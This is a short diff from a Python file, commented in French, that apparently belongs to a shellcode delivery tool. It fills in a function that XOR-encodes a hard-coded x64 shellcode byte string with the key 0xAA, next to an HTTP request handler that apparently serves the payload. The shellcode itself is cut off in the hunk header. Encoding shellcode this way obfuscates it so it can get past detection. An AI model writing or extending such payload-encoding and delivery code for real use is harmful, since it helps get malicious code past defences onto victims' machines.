@@ -6,9 +6,11 @@ SHELLCODE = b"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x
 
 ENCRYPTION_KEY = 0xAA
 
+# Fonction de chiffrement
 def encrypt_shellcode() -> bytes:
-    # TODO
-    return SHELLCODE
+    # Appliquer XOR à chaque octet
+    encrypted = bytes(byte ^ ENCRYPTION_KEY for byte in SHELLCODE)
+    return encrypted
 
 class MyHandler(BaseHTTPRequestHandler) :
     def extract_path(self)->str :
